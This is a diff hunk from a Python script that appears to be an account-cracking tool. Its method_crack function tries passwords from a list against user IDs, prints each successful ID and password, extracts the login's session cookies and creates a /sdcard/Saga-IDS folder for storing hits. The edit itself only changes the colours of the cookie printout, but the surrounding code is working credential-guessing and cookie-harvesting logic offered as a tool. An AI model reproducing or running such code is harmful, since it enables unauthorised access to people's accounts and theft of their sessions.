@@ -136,7 +136,7 @@ def method_crack(ids, passlist):
                 else:
                     print('\r\r \033[1;32m[Saga-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;31mm {byellow}[COOKIES]{byellow} '+coki)
+                    print('\033[1;33mm [{bblue}COOKIES{bblue}] '+coki)
                     # Vérifier si le dossier Saga-IDS existe et le créer si nécessaire
                     if not os.path.exists("/sdcard/Saga-IDS"):
                         os.makedirs("/sdcard/Saga-IDS")
